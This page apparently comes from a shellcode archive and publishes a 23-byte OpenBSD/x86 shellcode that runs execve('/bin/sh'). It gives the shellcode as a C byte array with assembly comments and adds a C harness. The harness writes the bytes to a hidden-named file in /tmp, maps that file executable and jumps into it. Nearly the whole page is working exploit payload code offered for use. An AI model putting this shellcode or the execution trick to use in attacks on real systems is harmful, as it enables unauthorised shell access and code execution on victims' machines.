<html><head><title>OpenBSD/x86 - execve(/bin/sh) - 23 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * [OpenBSD/x86]
 * Shellcode for: execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;], NULL)
 * 23 bytes
 * hophet [at] gmail.com
 * http://www.nlabs.com.br/~hophet/
 *
 * Fancy mappings by iruata souza (muzgo)
 * iru.muzgo!gmail.com
 * http://openvms-rocks.com/~muzgo/
 */

#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/mman.h&gt;

#include &lt;err.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
 
char shellcode[] =

&quot;\x99&quot;					/* cltd */
&quot;\x52&quot;					/* push	%edx */
&quot;\x68\x6e\x2f\x73\x68&quot;			/* push	$0x68732f6e */
&quot;\x68\x2f\x2f\x62\x69&quot;			/* push	$0x69622f2f */
&quot;\x89\xe3&quot;				/* mov	%esp,%ebx */
&quot;\x52&quot;					/* push	%edx */
&quot;\x54&quot;					/* push	%esp */
&quot;\x53&quot;                          	/* push	%ebx */
&quot;\x53&quot;					/* push	%ebx */
&quot;\x6a\x3b&quot;				/* push	$0x3b */
&quot;\x58&quot;					/* pop	%eax */
&quot;\xcd\x80&quot;;				/* int	$0x80 */

/*
 * Since shellcode above will be mapped in .rodata (read-only protection),
 * we need to write it to a file and map the file with PROT_EXEC in order
 * to execute it.
 */

int main(void)
{
        void (*p)();
	int fd;
	
	fd=open(&quot;/tmp/. &quot;, O_RDWR|O_CREAT, S_IRUSR|S_IWUSR);
	if(fd &lt; 0)
		err(1, &quot;open&quot;);
	
	write(fd, shellcode, strlen(shellcode));
	if((lseek(fd, 0L, SEEK_SET)) &lt; 0)
		err(1, &quot;lseek&quot;);

	p = (void (*)())mmap(NULL, strlen(shellcode), PROT_READ|PROT_EXEC, NULL, fd, NULL);
	if (p == (void (*)())MAP_FAILED)
		err(1, &quot;mmap&quot;);
	p();
	return 0;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
